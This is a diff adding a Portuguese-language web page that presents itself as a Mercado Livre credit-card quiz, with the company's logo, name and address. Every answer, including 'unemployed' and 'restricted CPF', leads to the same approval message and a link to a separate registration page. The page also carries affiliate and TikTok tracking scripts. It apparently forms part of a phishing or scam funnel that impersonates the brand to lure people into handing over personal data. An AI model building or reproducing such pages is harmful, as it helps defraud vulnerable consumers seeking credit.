@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mercado Livre - Quiz</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+    <script src="js/utmify-tracker.js"></script>
+    <script src="js/utmify-pixel-tiktok.js"></script>
+    <script src="js/tiktok-pixel-shop.js"></script>
+    <style>
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 100;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: #fff;
+            width: 90%;
+            max-width: 350px;
+            border-radius: 16px;
+            padding: 30px 20px;
+            text-align: center;
+        }
+
+        .modal-icon {
+            width: 60px;
+            height: 60px;
+            background: #e6ffe6;
+            color: #00a650;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            margin: 0 auto 20px;
+        }
+
+        .modal-title {
+            font-size: 22px;
+            font-weight: 800;
+            margin-bottom: 10px;
+        }
+
+        .modal-text {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="app-container app-container--quiz">
+        <header>
+            <a href="index.html" class="header-back" aria-label="Voltar">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                    <path d="M15 18L9 12L15 6" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"
+                        stroke-linejoin="round"></path>
+                </svg>
+            </a>
+            <div class="header-logo">
+                <img src="images/Mercado-Livre-logo.png" alt="Mercado Livre" width="150" height="36">
+            </div>
+        </header>
+
+        <div class="quiz-page-wrap">
+            <div class="quiz-container quiz-card">
+                <div class="progress-container">
+                    <div class="progress-info">
+                        <span id="stepLabel">Etapa 1</span>
+                        <span id="progressLabel">25% concluído</span>
+                    </div>
+                    <div class="progress-bar-bg">
+                        <div class="progress-bar-fill" id="progressBar" style="width: 25%;"></div>
+                    </div>
+                </div>
+
+                <!-- Step 1 -->
+                <div id="step1" class="quiz-step" data-quiz-step="1">
+                    <h2 class="question-title question-title--center">O que é mais importante para você em um cartão de
+                        crédito?</h2>
+                    <div class="options-grid">
+                        <button type="button" class="option-btn" onclick="goToStep(2)">
+                            <span class="option-icon" aria-hidden="true">
+                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none"
+                                    xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M7 9C7 6.79 8.79 5 11 5H13C15.21 5 17 6.79 17 9V20H7V9Z"
+                                        stroke="currentColor" stroke-width="1.4" stroke-linejoin="round"></path>
+                                    <path d="M7 20L5.5 21.5" stroke="currentColor" stroke-width="1.3"
+                                        stroke-linecap="round"></path>
+                                    <path d="M12 2V4" stroke="currentColor" stroke-width="1.3" stroke-linecap="round">
+                                    </path>
+                                    <circle cx="12" cy="12" r="2.2" fill="currentColor" opacity="0.85"></circle>
+                                </svg>
+                            </span>
+                            Limite alto
+                        </button>
+                        <button type="button" class="option-btn" onclick="goToStep(2)">
+                            <span class="option-icon" aria-hidden="true">
+                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none"
+                                    xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M12 2L14.5 8.5H9.5L12 2Z" fill="currentColor" opacity="0.9"></path>
+                                    <rect x="9.5" y="8" width="5" height="7" rx="0.5" fill="currentColor"
+                                        opacity="0.85"></rect>
+                                    <path d="M7 20L9.5 15.5H14.5L17 20" stroke="currentColor" stroke-width="1.35"
+                                        stroke-linejoin="round"></path>
+                                    <path d="M5 11L2 8L2 12L5 12" stroke="currentColor" stroke-width="1.1"
+                                        stroke-linejoin="round"></path>
+                                </svg>
+                            </span>
+                            Crédito imediato
+                        </button>
+                        <button type="button" class="option-btn" onclick="goToStep(2)">
+                            <span class="option-icon" aria-hidden="true">
+                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none"
+                                    xmlns="http://www.w3.org/2000/svg">
+                                    <circle cx="12" cy="12" r="7.5" stroke="currentColor" stroke-width="1.4"></circle>
+                                    <path d="M6.5 6.5L17.5 17.5" stroke="currentColor" stroke-width="1.4"
+                                        stroke-linecap="round"></path>
+                                </svg>
+                            </span>
+                            Não consultar SPC/Serasa
+                        </button>
+                        <button type="button" class="option-btn" onclick="goToStep(2)">
+                            <span class="option-icon" aria-hidden="true">
+                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none"
+                                    xmlns="http://www.w3.org/2000/svg">
+                                    <rect x="4" y="5" width="16" height="16" rx="1.5" stroke="currentColor"
+                                        stroke-width="1.3"></rect>
+                                    <path d="M4 9H20" stroke="currentColor" stroke-width="1.3"></path>
+                                    <path d="M8 3V6" stroke="currentColor" stroke-width="1.2" stroke-linecap="round">
+                                    </path>
+                                    <path d="M16 3V6" stroke="currentColor" stroke-width="1.2" stroke-linecap="round">
+                                    </path>
+                                </svg>
+                            </span>
+                            Sem anuidade
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Step 2 -->
+                <div id="step2" class="quiz-step hidden" data-quiz-step="2">
+                    <h2 class="question-title question-title--left">Em qual grupo você se encaixa?</h2>
+                    <div class="options-list">
+                        <button type="button" class="option-list-item" onclick="goToStep(3)">Empreendedor</button>
+                        <button type="button" class="option-list-item" onclick="goToStep(3)">Carteira assinada</button>
+                        <button type="button" class="option-list-item" onclick="goToStep(3)">Desempregado</button>
+                        <button type="button" class="option-list-item" onclick="goToStep(3)">Aposentado</button>
+                        <button type="button" class="option-list-item" onclick="goToStep(3)">Servidor público</button>
+                        <button type="button" class="option-list-item" onclick="goToStep(3)">Estudante</button>
+                        <button type="button" class="option-list-item" onclick="goToStep(3)">Autônomo</button>
+                    </div>
+                </div>
+
+                <!-- Step 3 — renda -->
+                <div id="step3" class="quiz-step hidden" data-quiz-step="3">
+                    <h2 class="question-title question-title--left">Qual sua renda mensal?</h2>
+                    <div class="options-list">
+                        <button type="button" class="option-list-item" onclick="goToStep(4)">Até R$ 1.000</button>
+                        <button type="button" class="option-list-item" onclick="goToStep(4)">Entre R$ 1.000 e R$
+                            2.000</button>
+                        <button type="button" class="option-list-item" onclick="goToStep(4)">Entre R$ 2.000 e R$
+                            4.000</button>
+                        <button type="button" class="option-list-item" onclick="goToStep(4)">Acima de R$ 4.000</button>
+                    </div>
+                </div>
+
+                <!-- Step 4 — CPF -->
+                <div id="step4" class="quiz-step hidden" data-quiz-step="4">
+                    <h2 class="question-title question-title--center">Você tem restrições no CPF?</h2>
+                    <div class="options-list">
+                        <button type="button" class="option-list-item" onclick="showModal()">Sim</button>
+                        <button type="button" class="option-list-item" onclick="showModal()">Não</button>
+                    </div>
+                </div>
+            </div>
+
+            <footer class="site-footer-quiz">
+                <p>Mercado Livre Brasil LTDA | CNPJ: 79.379.491.0008-50</p>
+                <p>Av. das Nações Unidas, 3000 - Bonfim, Osasco - SP, 06233-903</p>
+                <p>© 2026 - Todos os direitos reservados</p>
+            </footer>
+        </div>
+
+        <div class="modal-overlay" id="successModal" role="dialog" aria-modal="true" aria-labelledby="modalTitle"
+            aria-hidden="true">
+            <div class="modal-content">
+                <div class="modal-icon" aria-hidden="true">✓</div>
+                <h2 class="modal-title" id="modalTitle">Temos um cartão perfeito para você!</h2>
+                <p class="modal-text">Conclua seu cadastro e solicite seu cartão agora mesmo.</p>
+                <a href="../cadastro/index.html" class="btn btn-yellow">Continuar</a>
+            </div>
+        </div>
+    </div>
+
+    <script src="js/script.js"></script>
+    <script>
+        var progressByStep = {
+            1: { w: "25%", label: "Etapa 1", text: "25% concluído" },
+            2: { w: "50%", label: "Etapa 2", text: "50% concluído" },
+            3: { w: "75%", label: "Etapa 3", text: "75% concluído" },
+            4: { w: "100%", label: "Etapa 4", text: "100% concluído" }
+        };
+
+        function goToStep(targetStep) {
+            var steps = document.querySelectorAll(".quiz-step");
+            steps.forEach(function (el) { el.classList.add("hidden"); });
+            var next = document.getElementById("step" + targetStep);
+            if (next) next.classList.remove("hidden");
+
+            var p = progressByStep[targetStep];
+            if (p) {
+                document.getElementById("progressBar").style.width = p.w;
+                document.getElementById("stepLabel").textContent = p.label;
+                document.getElementById("progressLabel").textContent = p.text;
+            }
+        }
+
+        function showModal() {
+            var m = document.getElementById("successModal");
+            m.classList.add("active");
+            m.setAttribute("aria-hidden", "false");
+        }
+    </script>
+
+
+</body>
+
+</html>
